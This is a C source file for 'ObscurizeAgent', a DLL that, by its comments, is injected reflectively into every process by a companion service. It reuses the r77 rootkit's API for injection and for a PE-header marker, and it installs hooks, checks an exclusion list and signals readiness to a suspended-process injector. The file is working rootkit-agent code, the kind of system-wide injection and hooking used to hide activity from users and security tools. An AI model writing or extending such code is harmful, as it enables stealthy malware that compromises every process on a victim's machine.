#include "Agent.h"
#include "Config.h"
#include "Hooks.h"
#include "../ObscurizeShared/ObscurizeDef.h"

// r77api headers for the header-marker and utility functions
#include "../r77-rootkit/r77-rootkit-master/r77api/r77mindef.h"
#include "../r77-rootkit/r77-rootkit-master/r77api/r77header.h"

#include <Shlwapi.h>
#include <strsafe.h>

// ============================================================
//  ObscurizeAgent – Agent.c
//
//  DLL entry point.  Loaded reflectively into every process
//  by ObscurizeService using the injection mechanism from
//  r77api/r77process.c (adapted for Obscurize).
//
//  Lifecycle:
//    DLL_PROCESS_ATTACH  →  InitializeAgent()
//    Remote thread call  →  UninitializeAgent()
// ============================================================

static BOOL s_initialized = FALSE;

// ------------------------------------------------------------
//  Process exclusion check
// ------------------------------------------------------------

static BOOL IsExcludedProcess(VOID)
{
    WCHAR exePath[MAX_PATH + 1] = { 0 };
    if (FAILED(GetModuleFileNameW(NULL, exePath, MAX_PATH))) return TRUE;

    LPCWSTR exeName = PathFindFileNameW(exePath);
    static const LPCWSTR exclusions[] = OBS_PROCESS_EXCLUSIONS;

    for (int i = 0; exclusions[i] != NULL; i++)
    {
        if (StrCmpIW(exeName, exclusions[i]) == 0)
            return TRUE;
    }
    return FALSE;
}

// ------------------------------------------------------------
//  Write / remove the Obscurize header marker at PE offset 40
//  (same approach as r77 – lets the Service detect injection)
// ------------------------------------------------------------

// The detach callback address is stored right after the signature.
// When the Service wants to unload us it creates a remote thread
// here, which calls UninitializeAgent().
static VOID DetachCallback(VOID)
{
    UninitializeAgent();
}

// WriteR77Header / RemoveR77Header are declared in r77api/r77header.h
// We just call them with our own signature value.
static BOOL WriteAgentHeader(VOID)
{
    return WriteR77Header(OBS_AGENT_SIGNATURE, DetachCallback);
}

// ------------------------------------------------------------
//  Public lifecycle
// ------------------------------------------------------------

BOOL InitializeAgent(VOID)
{
    if (s_initialized) return FALSE;  // Already injected
    if (IsExcludedProcess()) return FALSE;

    if (!WriteAgentHeader()) return FALSE;

    s_initialized = TRUE;
    InitializeObsConfig();
    InitializeHooks();

    // Signal the pre-injection handshake: hooks are now attached and config is
    // loaded, so an injector holding this process suspended may safely resume
    // it.  Opportunistic — if nobody is waiting, creating and setting the event
    // is harmless.  See OBS_AGENT_READY_EVENT_FMT in ObscurizeDef.h.
    {
        WCHAR evName[64];
        StringCchPrintfW(evName, ARRAYSIZE(evName),
                         OBS_AGENT_READY_EVENT_FMT, GetCurrentProcessId());
        HANDLE ready = CreateEventW(NULL, TRUE, FALSE, evName);  // manual reset
        if (ready)
        {
            SetEvent(ready);
            CloseHandle(ready);
        }
    }

    return TRUE;
}

VOID UninitializeAgent(VOID)
{
    if (!s_initialized) return;
    s_initialized = FALSE;

    UninitializeHooks();
    UninitializeObsConfig();
    RemoveR77Header();
}

// ------------------------------------------------------------
//  DLL entry point
// ------------------------------------------------------------

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    (VOID)hinstDLL;
    (VOID)lpvReserved;

    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        // Disable per-thread DLL_THREAD_ATTACH/DETACH notifications
        DisableThreadLibraryCalls(hinstDLL);
        return InitializeAgent();
    }

    return TRUE;
}
